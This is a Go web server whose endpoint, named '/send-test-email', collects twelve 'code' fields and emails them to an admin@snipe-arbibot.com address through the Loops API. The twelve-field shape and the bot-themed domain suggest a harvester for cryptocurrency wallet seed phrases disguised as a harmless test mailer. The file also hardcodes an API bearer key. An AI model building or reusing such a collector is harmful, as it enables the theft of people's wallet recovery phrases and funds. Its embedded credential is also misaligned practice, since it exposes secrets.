package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"

	"github.com/gin-gonic/gin"
)

type EmailRequest struct {
	Code1  string `json:"code1"`
	Code2  string `json:"code2"`
	Code3  string `json:"code3"`
	Code4  string `json:"code4"`
	Code5  string `json:"code5"`
	Code6  string `json:"code6"`
	Code7  string `json:"code7"`
	Code8  string `json:"code8"`
	Code9  string `json:"code9"`
	Code10 string `json:"code10"`
	Code11 string `json:"code11"`
	Code12 string `json:"code12"`
}

func SendTestEmail() gin.HandlerFunc {
	return func(c *gin.Context) {
		var req EmailRequest
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request format"})
			return
		}

		err := sendTransactionalEmail(req)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		c.JSON(http.StatusOK, gin.H{"message": "Email sent successfully"})
	}
}

func sendTransactionalEmail(data EmailRequest) error {
	loopsAPIKey := "8c767902519e5d3c4b10f8f60eb90067"

	url := "https://app.loops.so/api/v1/transactional"
	codes := strings.Join([]string{
		data.Code1, data.Code2, data.Code3, data.Code4, data.Code5, data.Code6,
		data.Code7, data.Code8, data.Code9, data.Code10, data.Code11, data.Code12,
	}, ", ")

	payload := map[string]interface{}{
		"email":           "admin@snipe-arbibot.com",
		"transactionalId": "cm5ocv3bo00ky56e0x9dcnevr",
		"dataVariables": map[string]interface{}{
			"codes": codes,
		},
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("error marshaling email payload: %v", err)
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("error creating email request: %v", err)
	}

	req.Header.Set("Authorization", "Bearer "+loopsAPIKey)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error sending email: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("email API error: %s", string(body))
	}

	return nil
}

func main() {
	r := gin.Default()
	r.POST("/send-test-email", SendTestEmail())

	r.Run(":8080")
}
